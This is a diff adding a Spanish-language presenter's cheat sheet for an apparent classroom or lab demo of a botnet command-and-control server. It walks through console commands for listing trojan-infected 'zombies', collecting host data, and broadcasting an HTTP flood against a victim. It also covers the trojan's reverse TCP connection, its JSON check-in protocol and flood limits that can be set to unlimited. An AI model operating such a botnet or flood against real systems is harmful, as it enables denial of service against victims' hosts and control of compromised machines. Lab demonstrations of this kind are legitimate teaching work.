@@ -1,0 +1,48 @@
+============================================================
+ GUIA RAPIDA - DEMO BOTNET C2 (exposicion)
+============================================================
+
+ANTES DE EMPEZAR
+ 1. Verificar el servicio en AWS:   sudo systemctl status botnet-c2
+ 2. Entrar a la consola del C2:     tmux attach -t botnet-c2
+ 3. Tener a la vista:
+    - dashboard de Netdata de la victima (tunel SSH a localhost:19999)
+    - data/metricas.jsonl (evidencia de CPU/RAM/red)
+
+PASO A PASO DE LA DEMO
+ 1. list
+        -> tabla de zombies conectados (llegan solos: el troyano abre la
+           conexion inversa TCP 8443 y manda el "hello").
+ 2. select 1
+        -> elegir el zombie #1 (marca * en la tabla).
+ 3. send info
+        -> datos del equipo infectado: hostname, SO, usuario, CPUs.
+ 4. select all
+        -> volver a apuntar a TODOS los zombies (marca > en la tabla).
+ 5. ping all
+        -> prueba de vida: latencia de cada zombie.
+ 6. broadcast load target=http://IP_VICTIMA duration=30 concurrency=50
+        -> los zombies disparan la inundacion HTTP contra la victima;
+           en Netdata se ve subir CPU/RAM/red en vivo.
+ 7. metrics manual
+        -> guarda cpu/ram/red en data/metricas.jsonl (las tomas
+           antes/durante/despues del load se guardan solas).
+ 8. kick 1   (o  send stop  con un agente seleccionado)
+        -> expulsar / detener un agente.
+
+CIERRE
+ - Salir sin apagar el C2: Ctrl+B y luego D  (detach de tmux)
+ - Apagar el C2:            exit
+
+QUE DECIR (resumen tecnico)
+ - Conexion inversa: el troyano llama al C2 (TCP 8443), no al reves.
+ - Protocolo: una linea JSON por mensaje; el primero es el "hello" con
+   id, hostname, SO, usuario y secret (luego heartbeat cada 10 s).
+ - Flujo: el C2 ordena -> los zombies ejecutan (HTTP GET masivos)
+   -> el C2 observa (API de Netdata :19999) y deja evidencia JSONL.
+
+TOPES DE LA INUNDACION (por si preguntan)
+ - En .env: FLOOD_MAX_DURATION_S y FLOOD_MAX_CONCURRENCY.
+   Vacio = topes por defecto (120 s / 200 conexiones por agente).
+   0 = sin tope (solo para el laboratorio autorizado).
+ - Si se cambian, reiniciar el C2: sudo systemctl restart botnet-c2
